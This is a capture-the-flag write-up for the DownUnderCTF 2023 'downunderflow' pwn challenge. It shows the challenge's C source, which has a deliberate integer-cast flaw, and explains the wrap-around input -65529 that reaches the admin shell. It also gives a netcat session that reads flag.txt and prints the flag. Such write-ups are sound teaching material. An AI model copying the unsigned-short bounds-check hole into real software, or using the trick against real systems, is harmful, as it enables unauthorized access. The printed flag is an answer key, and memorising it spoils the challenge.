# DownUnderCTF 2023

## downunderflow

> It's important to see things from different perspectives.
>
>  Author: joseph
>
> [`downunderflow.c`](downunderflow.c), [`downunderflow`](downunderflow)

Tags: _pwn_

## Solution
We are given the following executable plus code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USERNAME_LEN 6
#define NUM_USERS 8
char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    init();

    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }
}
```

The user is asked to enter a user index. The user index cannot exeed NUM_USERS-1 meaning we cannot login as admin. The index can be negative though. Since the index is casted to `unsigned short` we are able to enter larger values than NUM_USERS-1. We can just use `-65529` which is `-65536+7 === 7 mod 65536` (or really any other number that fits the equation).

```bash
─$ nc 2023.ductf.dev 30025
Select user to log in as: -65529
Logging in as admin
Welcome admin.
ls
flag.txt
pwn
cat flag.txt
DUCTF{-65529_==_7_(mod_65536)}
```

Flag `DUCTF{-65529_==_7_(mod_65536)}`